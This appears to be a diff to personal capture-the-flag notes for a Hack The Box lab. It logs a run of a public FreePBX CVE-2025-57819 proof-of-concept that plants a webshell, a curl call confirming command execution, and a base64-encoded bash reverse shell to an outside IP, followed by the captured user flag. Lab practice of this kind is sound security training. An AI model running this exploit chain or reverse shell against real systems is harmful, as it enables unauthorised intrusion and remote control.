@@ -31,6 +31,42 @@ found CVE-2025-57819
 ```
 https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819/blob/main/README.md
 
+ajdev@rootbox:~/HTB/Seasion11/Connected$ python3 poc.py -H http://connected.htb
+			 __         ___  ___________
+	 __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________
+	 \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
+	  \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
+	   \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|
+				  \/          \/     \/
+	
+        watchTowr-vs-FreePBX-CVE-2025-57819.py
+        (*) CVE-2025-57819 Detection Artifact Generator: FreePBX Auth Bypass + SQL Injection to RCE
+
+          - Piotr and Sonny of watchTowr
+
+[+] FreePBX CVE-2025-57819 Detection Artifact Generator started
+[+] Sending exploit request
+[+] Waiting 2 minutes for DAG script to be created
+[+] VULNERABLE - webshell found: http://connected.htb/this-is-an-ioc-not-actually-watchTowr-f37v37ohsf.php?cmd=hostname
+[+] Cleaning.sh malicious cron_job - please confirm manually that there is no malicious entries in asterisk.cron_jobs table
+
+ajdev@rootbox:~/HTB/Seasion11/Connected$ curl -i "http://connected.htb/this-is-an-ioc-not-actually-watchTowr-9svoopf4m4.php?cmd=hostname"
+HTTP/1.1 200 OK
+Date: Sun, 07 Jun 2026 12:24:18 GMT
+Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
+X-Powered-By: PHP/7.4.16
+Content-Length: 10
+Content-Type: text/html; charset=UTF-8
+
+connected
+
+curl -iG "http://connected.htb/this-is-an-ioc-not-actually-watchTowr-9svoopf4m4.php" \
+  --data-urlencode "cmd=echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS42NC80NDQ0IDA+JjEK | base64 -d | bash"
+  
+[asterisk@connected asterisk]$ cat user.txt
+cat user.txt
+e452a36df6e7044492ae066a485612b5
+
 
 ```
 
